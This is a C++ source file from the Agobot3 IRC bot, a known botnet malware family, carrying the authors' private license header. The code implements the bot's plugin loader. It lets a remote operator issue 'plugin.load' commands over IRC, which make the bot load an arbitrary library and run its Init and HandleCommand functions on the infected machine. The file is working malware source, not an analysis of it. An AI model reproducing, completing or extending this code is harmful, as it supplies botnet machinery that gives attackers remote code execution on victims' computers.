/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "cplugin.h"
#include "mainctrl.h"

CPlugin::CPlugin() {
	m_pfnInit=NULL;
	m_pfnShutdown=NULL;
	m_pfnHandleCommand=NULL;
	m_hPlugin=NULL;
}

CPlugin::~CPlugin() {
	Unload();
}

bool CPlugin::Load(CString &sFilename) {
	m_hPlugin=xLoadLib(sFilename.CStr());
	if(!m_hPlugin) return false;

	m_pfnInit=NULL;
	m_pfnShutdown=NULL;
	m_pfnHandleCommand=NULL;

	m_pfnInit			=	(InitFunc)			xGetSym(m_hPlugin, "Init"			);
	m_pfnShutdown		=	(ShutdownFunc)		xGetSym(m_hPlugin, "Shutdown"		);
	m_pfnHandleCommand	=	(HandleCommandFunc)	xGetSym(m_hPlugin, "HandleCommand"	);
	if(!m_pfnInit || !m_pfnShutdown || !m_pfnHandleCommand) {
		Unload(); return false; }
	
	return true;
}

void CPlugin::Unload() {
	if(m_hPlugin) {
		if(m_pfnShutdown) m_pfnShutdown(); xFreeLib(m_hPlugin);
		m_pfnInit=NULL;
		m_pfnShutdown=NULL;
		m_pfnHandleCommand=NULL;
		m_hPlugin=NULL;
	}
}

bool CPlugin::Init() {
	if(!m_pfnInit) return false;
	return m_pfnInit(g_pMainCtrl, this);
}

bool CPlugin::HandleCommand(CMessage *pMsg) {
	if(!m_pfnHandleCommand) return false;
	return m_pfnHandleCommand(pMsg);
}

CPluginLoader::CPluginLoader() {
}

CPluginLoader::~CPluginLoader() {
}

bool CPluginLoader::Init() {
	return true;
}

bool CPluginLoader::HandleCommand(CMessage *pMsg) {
	CString sFilename=pMsg->sChatString.Token(1, " ", true);
	if(!sFilename.Compare("")) return false;

	if(!pMsg->sCmd.Compare(m_cmdLoad.szName)) {
		CPlugin *pPlugin=new CPlugin;
		if(!pPlugin->Load(sFilename)) {
			pMsg->pReply->DoReplyF(pMsg, "Failed to load plugin \"%s\".", sFilename.CStr());
			delete pPlugin; return false;
		}

		if(!pPlugin->Init()) {
			pMsg->pReply->DoReplyF(pMsg, "Failed to init plugin \"%s\".", sFilename.CStr());
			delete pPlugin; return false;
		}
		
		pMsg->pReply->DoReplyF(pMsg, "Loaded plugin \"%s\".", sFilename.CStr());

		return true; }

	else if(!pMsg->sCmd.Compare(m_cmdUnload.szName)) {
		return false; }
	
	return false;
}

REGOBJ(CPluginLoader, g_pPluginLoader, false, 0);
REGCMD(m_cmdLoad,	"plugin.load",								false,	g_pPluginLoader);
REGCMD(m_cmdUnload,	"plugin.unload",	false,	g_pPluginLoader);
